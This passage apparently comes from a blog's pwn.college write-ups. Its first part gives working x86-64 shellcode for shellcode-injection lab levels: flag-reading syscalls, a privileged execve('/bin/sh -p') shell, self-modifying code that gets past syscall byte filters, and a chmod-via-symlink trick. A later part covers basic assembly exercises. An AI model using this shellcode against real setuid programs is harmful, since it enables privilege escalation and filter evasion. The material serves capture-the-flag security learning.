3</h4><p>This challenge requires that your shellcode have no NULL bytes!</p><p><code>gcc -static -nostdlib file.s -o file.elf ; objcopy --dump-section .text=file.bin file.elf ; hd file.bin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start<br>.intel_syntax noprefix<br>_start:<br>xor rax, rax<br>mov al, 0x67<br>shl rax, 0x20<br>xor rbx, rbx<br>mov ebx, 0x616c662f<br>add rbx, rax<br>push rbx<br>xor rax, rax<br>mov al, 2<br>mov rdi, rsp<br>xor rsi, rsi<br>syscall<br><br>xor rdi, rdi<br>inc rdi<br>mov rsi, rax<br>xor rdx, rdx<br>xor rax, rax<br>mov al, 0xff<br>mov r10, rax<br>xor rax, rax<br>mov al, 0x28<br>syscall<br><br>xor rax, rax<br>mov al, 0x3c<br>syscall<br></code></pre></td></tr></table></figure><h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4><p>This challenge requires that your shellcode have no H bytes!</p><p>不让用H就是说不能用64位的mov及相关的xor, or, shl指令，但是可以用32位指令，而且push和pop到rax不影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */<br>    /* push b&#x27;/bin///sh\x00&#x27; */<br>    push 0x68<br>    //mov rax, 0x732f2f2f6e69622f<br>    //push rax<br>    push 0x6e69622f<br>    mov dword ptr [rsp+4],0x732f2f2f<br>    //mov rdi, rsp<br>    push rsp<br>    pop rdi<br>    /* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */<br>    /* push b&#x27;sh\x00-p\x00&#x27; */<br>    //mov rax, 0x702d006873<br>    //push rax<br>    push 0x2d006873<br>    mov dword ptr [rsp+4],0x70<br>    xor esi, esi /* 0 */<br>    push rsi /* null terminate */<br>    //push 0xb<br>    //pop rsi<br>    //add rsi, rsp<br>    push rsp<br>    add dword ptr [rsp],0xb<br>    //pop rsi<br>    //push rsi /* &#x27;-p\x00&#x27; */<br>    //push 0x10<br>    //pop rsi<br>    //add rsi, rsp<br>    //push rsi /* &#x27;sh\x00&#x27; */<br>    push rsp<br>    add dword ptr [rsp],0x10<br>    //mov rsi, rsp<br>    push rsp<br>    pop rsi<br>    xor edx, edx /* 0 */<br>    /* call execve() */<br>    push 0x3b /* 0x3b */<br>    pop rax<br>    syscall<br></code></pre></td></tr></table></figure><h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h4><blockquote><p>This challenge requires that your shellcode does not have any <code>syscall</code>, ‘sysenter’, or <code>int</code> instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>). One way to evade this is to have your shellcode modify itself to insert the <code>syscall</code> instructions at runtime.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x68<br>    mov rax, 0x732f2f2f6e69622f<br>    push rax<br>    mov rdi, rsp<br>    mov rax, 0x101010101010101<br>    push rax<br>    mov rax, 0x101010101010101 ^ 0x702d006873<br>    xor [rsp], rax<br>    xor esi, esi<br>    push rsi<br>    push 0xb<br>    pop rsi<br>    add rsi, rsp<br>    push rsi<br>    push 0x10<br>    pop rsi<br>    add rsi, rsp<br>    push rsi<br>    mov rsi, rsp<br>    xor edx, edx<br>    push 0x3b<br>    pop rax<br>    push 0x050e<br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br></code></pre></td></tr></table></figure><h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h4><blockquote><p>This challenge requires that your shellcode does not have any <code>syscall</code>, ‘sysenter’, or <code>int</code> instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>). One way to evade this is to have your shellcode modify itself to insert the <code>syscall</code> instructions at runtime.</p><p>Removing write permissions from first 4096 bytes of shellcode.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rept 0x1000<br>    nop<br>    .endr<br>    push 0x68<br>    mov rax, 0x732f2f2f6e69622f<br>    push rax<br>    mov rdi, rsp<br>    mov rax, 0x101010101010101<br>    push rax<br>    mov rax, 0x101010101010101 ^ 0x702d006873<br>    xor [rsp], rax<br>    xor esi, esi<br>    push rsi<br>    push 0xb<br>    pop rsi<br>    add rsi, rsp<br>    push rsi<br>    push 0x10<br>    pop rsi<br>    add rsi, rsp<br>    push rsi<br>    mov rsi, rsp<br>    xor edx, edx<br>    push 0x3b<br>    pop rax<br>    push 0x050e<br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br></code></pre></td></tr></table></figure><h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h4><blockquote><p>This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.</p><p>This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.</p><p>This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output. You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* chmod(file=&#x27;/flag&#x27;, mode=4) */<br>/* push b&#x27;/flag\\x00&#x27; */<br>mov rax, 0x101010101010101<br>push rax<br>mov rax, 0x101010101010101 ^ 0x67616c662f<br>xor [rsp], rax<br>mov rdi, rsp<br>push 4<br>pop rsi /* call chmod() */<br>push SYS_chmod /* 0x5a */<br>pop rax<br>syscall<br></code></pre></td></tr></table></figure><h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h4><blockquote><p>Reading 0x12 bytes from stdin.</p><p>Removing write permissions from first 4096 bytes of shellcode.</p></blockquote><p>这一题的意思是说要求我们的shellcode要在0x12字节以内。和上一题一样可以用chmod来做。linux有一个特性，chmod在操作软链接时不会作用于软链接，而会直接作用于所指向的文件，这样就不用输入<code>/flag</code>这5个字节了，只需要使用任意自定义一个字节即可。</p><p><code> ln -s /flag f</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* chmod(file=&#x27;f&#x27;, mode=4) */<br>/* push b&#x27;f\x00&#x27; */<br>push 0x66<br>mov rdi, rsp<br>push 4<br>pop rsi<br>/* call chmod() */<br>push SYS_chmod /* 0x5a */<br>pop rax<br>syscall<br></code></pre></td></tr></table></figure><p>新建一个名为<code>a</code>的脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash -p</span><br>id<br>cat /flag<br></code></pre></td></tr></table></figure><p>使用<code>shellcraft.amd64.linux.execve(&#39;a&#39;)</code>获取汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* execve(path=&#x27;a&#x27;, argv=0, envp=0) */<br>/* push b&#x27;a\\x00&#x27; */<br>push 0x61<br>mov rdi, rsp<br>xor edx, edx /* 0 */<br>xor esi, esi /* 0 or cdq*/ <br>/* call execve() */<br>mov al,0x3b <br>syscall<br></code></pre></td></tr></table></figure><h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h4><blockquote><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p></blockquote><p>每隔10字节就会用10个中断替换，用循环跳过就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x66<br>mov rdi, rsp<br>push 4<br>pop rsi<br>jmp next<br>.rept 10<br>nop<br>.endr<br>/* call chmod() */<br>next:<br>push SYS_chmod /* 0x5a */<br>pop rax<br>syscall<br></code></pre></td></tr></table></figure><h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4><blockquote><p>This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort<br>(e.g., the LSB being the right-most byte).</p><p>This sort processed your shellcode 8 bytes at a time.</p></blockquote><p>代码同level 9</p><h4 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h4><blockquote><p>This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need<br>to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.</p></blockquote><p>代码同level 9</p><h4 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h4><blockquote><p>This challenge requires that every byte in your shellcode is unique!</p></blockquote><p>说实话这就有点强人所难了，像极了需要特殊解法的奥数题。具体做法就是用不同命令互相进行替换。用上面的代码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x63<br>  mov rdi, rsp<br>  xor esi, esi<br>  cdq<br>  mov al,0x3b<br>  syscall<br><br></code></pre></td></tr></table></figure><h4 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h4><blockquote><p>Reading 0xc bytes from stdin.</p></blockquote><p>还是用上一题的代码。</p><h4 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h4><blockquote><p>Reading 0x6 bytes from stdin.</p></blockquote><p>这一题直接又把空间砍了一半，推理一下其实可以想到肯定是已经帮我们做了一切工作，不然只用6字节肯定不够，所以说现在的任务就是确定哪些寄存器的值已经被设置好。</p><p>&#x2F;* execve(path&#x3D;’&#x2F;bin&#x2F;sh’, argv&#x3D;[‘sh’, ‘-p’], envp&#x3D;0) *&#x2F;</p><p>push 0x1010101<br>xor dword ptr [esp], 0x169722e<br>push 0x6e69622f<br>mov ebx, esp\</p><p>push 0x70<br>push 0x1010101<br>xor dword ptr [esp], 0x2c016972<br>xor ecx, ecx<br>push ecx<br>push 7<br>pop ecx<br>add ecx, esp<br>push ecx<br>push 8<br>pop ecx<br>add ecx, esp<br>push ecx<br>mov ecx, esp<br>xor edx, edx<br>push 0xb<br>pop eax<br>int 0x80</p><p> &#x2F;* execve(path&#x3D;’c’, argv&#x3D;0, envp&#x3D;0) <em>&#x2F;<br> &#x2F;</em> push b’c\x00’ *&#x2F;<br> push 0x63<br> mov rdi, rsp<br> xor edx, edx<br> xor esi, esi<br> push 0x3b<br> pop rax<br>syscall</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn.college</tag>
      
      <tag>Shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college: Assembly Refreasher</title>
    <link href="/2022/02/27/2022-2-27-Assembly-Refresher/"/>
    <url>/2022/02/27/2022-2-27-Assembly-Refresher/</url>
    
    <content type="html"><![CDATA[<p>模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br><br>r = process([<span class="hljs-string">&quot;/challenge/embryoasm_level&quot;</span>])<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>log.success(<span class="hljs-built_in">str</span>(payload)) <br><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>Another cool concept in x86 is the independent access to lower register bytes.<br>Each register in x86 is 64 bits in size, in the previous levels we have accessed<br>the full register using rax, rdi or rsi. We can also access the lower bytes of<br>each register using different register names. For example the lower<br>32 bits of rax can be accessed using eax, lower 16 bits using ax,<br>lower 8 bits using al, etc.<br>MSB                                    LSB<br>+—————————————-+<br>|              rax              |<br>+——————–+——————-+<br>                                    |        eax        |<br>                                 +———+———+<br>                                                           |   ax    |<br>                                                     +—-+—-+<br>                                                          | ah | al |<br>                                                       +—-+—-+<br>Lower register bytes access is applicable to all registers_use.</p><p>Using only the following instruction(s):<br>mov<br>Please compute the following:<br>rax &#x3D; rdi modulo 256<br>rbx &#x3D; rsi module 65536<br>mod256 就是低8位设置为0，mod 65535就是低16位设置为0    </p><p><img src="https://img-blog.csdn.net/20160428232504330" alt="寄存器比较"></p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>In this level you will be working with bit logic and operations. This will involve heavy use of directly interacting with bits stored in a register or memory location. You will also likely need to make use of the logic instructions in x86: and, or, not, xor.</p><p>Shifting in assembly is another interesting concept! x86 allows you to ‘shift’<br>bits around in a register. Take for instance, rax. For the sake of this example<br>say rax only can store 8 bits (it normally stores 64). The value in rax is:<br>rax &#x3D; 10001010<br>We if we shift the value once to the left:<br>shl rax, 1<br>The new value is:<br>rax &#x3D; 00010100<br>As you can see, everything shifted to the left and the highest bit fell off and<br>a new 0 was added to the right side. You can use this to do special things to<br>the bits you care about. It also has the nice side affect of doing quick multiplication,<br>division, and possibly modulo.<br>Here are the important instructions:<br>shl reg1, reg2       &lt;&#x3D;&gt;     Shift reg1 left by the amount in reg2<br>shr reg1, reg2       &lt;&#x3D;&gt;     Shift reg1 right by the amount in reg2<br>Note: all ‘regX’ can be replaced by a constant or memory location</p><p>Using only the following instructions:<br>mov, shr, shl<br>Please perform the following:<br>Set rax to the 4th least significant byte of rdi<br>i.e.<br>rdi &#x3D; | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |<br>Set rax to the value of B3</p><h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shr rdi, 0x18<br>mov rax, 0<br>mov al, dil<br></code></pre></td></tr></table></figure><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>In this level you will be working with bit logic and operations. This will involve heavy use of directly interacting with bits stored in a register or memory location. You will also likely need to make use of the logic instructions in x86: and, or, not, xor.</p><p>Bitwise logic in assembly is yet another interesting concept!<br>x86 allows you to perform logic operation bit by bit on registers.<br>For the sake of this example say registers only store 8 bits.<br>The values in rax and rbx are:<br>rax &#x3D; 10101010<br>rbx &#x3D; 00110011<br>If we were to perform a bitwise AND of rax and rbx using the “and rax, rbx” instruction<br>the result would be calculated by ANDing each pair bits 1 by 1 hence why<br>it’s called a bitwise logic. So from left to right:<br>1 AND 0 &#x3D; 0, 0 AND 0 &#x3D; 0, 1 AND 1 &#x3D; 1, 0 AND 1 &#x3D; 0 …<br>Finally we combine the results together to get:<br>rax &#x3D; 00100010<br>Here are some truth tables for reference:<br>    AND          OR           XOR<br> A | B | X    A | B | X    A | B | X<br>—+—+—  —+—+—  —+—+—<br> 0 | 0 | 0    0 | 0 | 0    0 | 0 | 0<br> 0 | 1 | 0    0 | 1 | 1    0 | 1 | 1<br> 1 | 0 | 0    1 | 0 | 1    1 | 0 | 1<br> 1 | 1 | 1    1 | 1 | 1    1 | 1 | 0</p><p>Without using the following instructions:<br>mov, xchg<br>Please perform the following:<br>rax &#x3D; rdi AND rsi<br>i.e. Set rax to the value of (rdi AND rsi)</p><p>AND 指令在两个操作数的对应位之间进行（按位）逻辑与（AND）操作，并将结果存放在目标操作数中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and rdi, rsi<br>xor rax, rax    # clear rax<br>or rax, rdi     # set rax = rdi<br></code></pre></td></tr></table></figure><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>In this level you will be working with bit logic and operations. This will involve heavy use of directly interacting with bits stored in a register or memory location. You will also likely need to make use of the logic instructions in x86: and, or, not, xor.</p><p>Using only following instructions:<br>and, or, xor<br>Implement the following logic:</p><p>if x is even then<br>  y &#x3D; 1<br>else<br>  y &#x3D; 0<br>where:<br>x &#x3D; rdi<br>y &#x3D; rax</p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>In this level you will be working with memory. This will require you to read or write<br>to things stored linearly in memory. If you are confused, go look at the linear<br>addressing module in ‘ike. You may also be asked to dereference things, possibly multiple<br>times, to things we dynamically put in memory for you use.</p><p>Up until now you have worked with registers as the only way for storing things, essentially<br>variables like ‘x’ in math. Recall that memory can be addressed. Each address contains something<br>at that location, like real addresses! As an example: the address ‘699 S Mill Ave, Tempe, AZ 85281’<br>maps to the ‘ASU Campus’. We would also say it points to ‘ASU Campus’.  We can represent this like:<br>[‘699 S Mill Ave, Tempe, AZ 85281’] &#x3D; ‘ASU Campus’<br>The address is special because it is unique. But that also does not mean other address cant point to<br>the same thing (as someone can have multiple houses). Memory is exactly the same! For instance,the address in memory that your code is stored (when we take it from you) is 0x400000.<br>In x86 we can access the thing at a memory location, called dereferencing, like so:<br>mov rax, [some_address]        &lt;&#x3D;&gt;     Moves the thing at ‘some_address’ into rax<br>This also works with things in registers:<br>mov rax, [rdi]         &lt;&#x3D;&gt;     Moves the thing stored at the address of what rdi holds to rax<br>This works the same for writing:<br>mov [rax], rdi         &lt;&#x3D;&gt;     Moves rdi to the address of what rax holds.<br>So if rax was 0xdeadbeef, then rdi would get stored at the address 0xdeadbeef:<br>[0xdeadbeef] &#x3D; rdi<br>Note: memory is linear, and in x86, it goes from 0 - 0xffffffffffffffff (yes, huge).</p><p>Please perform the following:</p><ol><li>Place the value stored at 0x404000 into rax</li><li>Increment the value stored at the address 0x404000 by 0x1337<br>Make sure the value in rax is the original value stored at 0x404000 and make sure<br>that [0x404000] now has the incremented value.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, [0x404000]<br>mov rbx, 0x1337<br>add [0x404000], rbx<br></code></pre></td></tr></table></figure><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p>In this level you will be working with memory. This will require you to read or write<br>to things stored linearly in memory. If you are confused, go look at the linear<br>addressing module in ‘ike. You may also be asked to dereference things, possibly multiple<br>times, to things we dynamically put in memory for you use.</p><p>Recall that registers in x86_64 are 64 bits wide, meaning they can store 64 bits in them.<br>Similarly, each memory location is 64 bits wide. We refer to something that is 64 bits<br>(8 bytes) as a quad word. Here is the breakdown of the names of memory sizes:</p><ul><li>Quad Word &#x3D; 8 Bytes &#x3D; 64 bits</li><li>Double Word &#x3D; 4 bytes &#x3D; 32 bits</li><li>Word &#x3D; 2 bytes &#x3D; 16 bits</li><li>Byte &#x3D; 1 byte &#x3D; 8 bits<br>In x86_64, you can access each of these sizes when dereferencing an address, just like using<br>bigger or smaller register accesses:<br>mov al, [address]        &lt;&#x3D;&gt;         moves the least significant byte from address to rax<br>mov ax, [address]        &lt;&#x3D;&gt;         moves the least significant word from address to rax<br>mov eax, [address]        &lt;&#x3D;&gt;         moves the least significant double word from address to rax<br>mov rax, [address]        &lt;&#x3D;&gt;         moves the full quad word from address to rax<br>Remember that moving only into al for instance does not fully clear the upper bytes.</li></ul><p>Please perform the following:</p><ol><li>Set rax to the byte at 0x404000</li><li>Set rbx to the word at 0x404000</li><li>Set rcx to the double word at 0x404000</li><li>Set rdx to the quad word at 0x404000</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:mov   al, byte ptr [0x404000]<br>0x400007:mov   bx, word ptr [0x404000]<br>0x40000f:mov   ecx, dword ptr [0x404000]<br>0x400016:mov   rdx, qword ptr [0x404000]<br></code></pre></td></tr></table></figure><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p>In this level you will be working with memory. This will require you to read or write<br>to things stored linearly in memory. If you are confused, go look at the linear<br>addressing module in ‘ike. You may also be asked to dereference things, possibly multiple<br>times, to things we dynamically put in memory for you use.</p><p>It is worth noting, as you may have noticed, that values are stored in reverse order of how we<br>represent them. As an example, say:<br>[0x1330] &#x3D; 0x00000000deadc0de<br>If you examined how it actually looked in memory, you would see:<br>[0x1330] &#x3D; 0xde 0xc0 0xad 0xde 0x00 0x00 0x00 0x00<br>This format of storing things in ‘reverse’ is intentional in x86, and its called Little Endian.</p><p>For this challenge we will give you two addresses created dynamically each run. The first address will be placed in rdi. The second will be placed in rsi.<br>Using the earlier mentioned info, perform the following:</p><ol><li>set [rdi] &#x3D; 0xDEADBEEF00001337</li><li>set [rsi] &#x3D; 0x000000C0FFEE0000<br>Hint: it may require some tricks to assign a big constant to a dereferenced register. Try setting a register to the constant than assigning that register to the derefed register.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:movabsrax, 0xdeadbeef00001337<br>0x40000a:movabsrbx, 0xc0ffee0000<br>0x400014:mov   qword ptr [rdi], rax<br>0x400017:mov   qword ptr [rsi], rbx<br></code></pre></td></tr></table></figure><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>In this level you will be working with memory. This will require you to read or write<br>to things stored linearly in memory. If you are confused, go look at the linear<br>addressing module in ‘ike. You may also be asked to dereference things, possibly multiple<br>times, to things we dynamically put in memory for you use.</p><p>Recall that memory is stored linearly. What does that mean? Say we access the quad word at 0x1337:<br>[0x1337] &#x3D; 0x00000000deadbeef The real way memory is layed out is byte by byte, little endian:<br>[0x1337] &#x3D; 0xef<br>[0x1337 + 1] &#x3D; 0xbe<br>[0x1337 + 2] &#x3D; 0xad<br>…<br>[0x1337 + 7] &#x3D; 0x00<br>What does this do for us? Well, it means that we can access things next to each other using offsets,<br>like what was shown above. Say you want the 5th <em>byte</em> from an address, you can access it like:<br>mov al, [address+4]<br>Remember, offsets start at 0.</p><p>Preform the following:</p><ol><li>load two consecutive quad words from the address stored in rdi</li><li>calculate the sum of the previous steps quad words.</li><li>store the sum at the address in rsi</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:mov   rax, qword ptr [rdi]<br>0x400003:mov   rbx, qword ptr [rdi + 8]<br>0x400007:add   rax, rbx<br>0x40000a:mov   qword ptr [rsi], rax<br></code></pre></td></tr></table></figure><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>In this level you will be working with the Stack, the memory region that dynamically expands and shrinks. You will be required to read and write to the Stack, which may require you to use the pop &amp; push instructions. You may also need to utilize rsp to know where the stack is pointing.</p><p>In these levels we are going to introduce the stack.<br>The stack is a region of memory, that can store values for later.<br>To store a value a on the stack we use the push instruction, and to retrieve a value we use pop.<br>The stack is a last in first out (LIFO) memory structure this means<br>the last value pushed in the first value popped.<br>Imagine unloading plates from the dishwasher let’s say there are 1 red, 1 green, and 1 blue.<br>First we place the red one in the cabinet, then the green on top of the red, then the blue.<br>Out stack of plates would look like:<br>Top —-&gt; Blue<br>          Green<br>Bottom -&gt; Red<br>Now if wanted a plate to make a sandwhich we would retrive the top plate from the stack<br>which would be the blue one that was last into the cabinet, ergo the first one out.</p><p>Subtract rdi from the top value on the stack.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:sub   qword ptr [rsp], rdi<br></code></pre></td></tr></table></figure><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p>In this level you will be working with the Stack, the memory region that dynamically expands and shrinks. You will be required to read and write to the Stack, which may require you to use the pop &amp; push instructions. You may also need to utilize rsp to know where the stack is pointing.</p><p>In this level we are going to explore the last in first out (LIFO) property of the stack.</p><p>Using only following instructions:<br>push, pop<br>Swap values in rdi and rsi.<br>i.e.<br>If to start rdi &#x3D; 2 and rsi &#x3D; 5<br>Then to end rdi &#x3D; 5 and rsi &#x3D; 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:push  rdi<br>0x400001:push  rsi<br>0x400002:pop   rdi<br>0x400003:pop   rsi<br></code></pre></td></tr></table></figure><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p>In the previous levels you used push and pop to store and load data from the stack<br>however you can also access the stack directly using the stack pointer.<br>The stack pointer is stored in the special register “rsp”.<br>rsp always stores the memory address to the top of the stack,<br>i.e. the 